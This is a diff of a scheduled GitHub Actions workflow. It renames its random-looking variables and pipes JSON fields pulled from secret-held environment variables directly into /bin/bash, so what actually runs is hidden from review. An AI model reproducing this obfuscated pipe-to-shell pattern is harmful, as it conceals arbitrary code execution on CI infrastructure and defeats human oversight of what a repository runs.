@@ -1,25 +1,28 @@
 name: jixiaxingliang
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 3/6 * * *'
+    - cron: '17 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jixiaxingliang
         env:
-          bqnm4252: ${{ secrets.bqnm4252 }}
+          gonsh5: ${{ secrets.gonsh5 }}
         run: |
-          echo $bqnm4252 | jq -r .heafp04043 | /bin/bash
-          echo $kpni4654 | jq -r .zida53 | /bin/bash
-          echo $j66 | jq -r .y132 | /bin/bash
-          echo $csm97 | jq -r .xhnqh6 | /bin/bash
-          echo $zv54 | jq -r .zq8290 | /bin/bash
-          echo $sqxpv3 | jq -r .v3 | /bin/bash
-          echo $yqvjy67020 | jq -r .yuof2393 | /bin/bash
+          echo $gonsh5 | jq -r .tz49381 | /bin/bash
+          echo $c60807 | jq -r .axhjd8 | /bin/bash
+          echo $wm98957 | jq -r .dpk6 | /bin/bash
+          echo $dmxk11476 | jq -r .gchr140 | /bin/bash
+          echo $omj542 | jq -r .poejq518 | /bin/bash
+          echo $ohmf0250 | jq -r .ylfvb57482 | /bin/bash
+          echo $whbaw3 | jq -r .s502 | /bin/bash
+          echo $wzas7589 | jq -r .vwafs0 | /bin/bash
+          echo $ayqh8 | jq -r .xsckx322 | /bin/bash
+          echo $ytkj08 | jq -r .mqu9 | /bin/bash
+          echo $dc4386 | jq -r .nkr1 | /bin/bash
+          echo $ck2072 | jq -r .ucu9088 | /bin/bash
 
